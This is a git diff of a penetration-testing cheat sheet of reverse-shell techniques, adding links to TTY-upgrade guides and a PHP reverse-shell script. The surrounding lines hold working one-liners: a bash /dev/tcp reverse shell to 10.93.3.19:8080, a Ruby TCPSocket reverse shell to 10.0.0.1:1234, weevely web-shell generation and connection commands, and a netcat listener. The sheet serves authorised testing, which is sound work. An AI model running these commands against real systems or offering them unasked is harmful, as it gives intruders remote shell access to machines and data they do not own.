@@ -8,6 +8,9 @@ https://www.metahackers.pro/spawing-tty-shells/
 ## Create Full interactive shell (Cntrl^C)
 https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/
 
+ ## Upbrade from limited shell
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
 # Bash
 - bash -i >& /dev/tcp/10.93.3.19/8080 0>&1
 
@@ -22,6 +25,10 @@ https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/
 - Geneare with weevwly
 	> weevely generate [pasword] [outputfile.php]	
 	> weevely [http://server-ip:port/outputfile.php] [pasword]
+
+- https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+	> Config listerner as nc -lvnp [port]
+
 
 # Ruby
 - ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
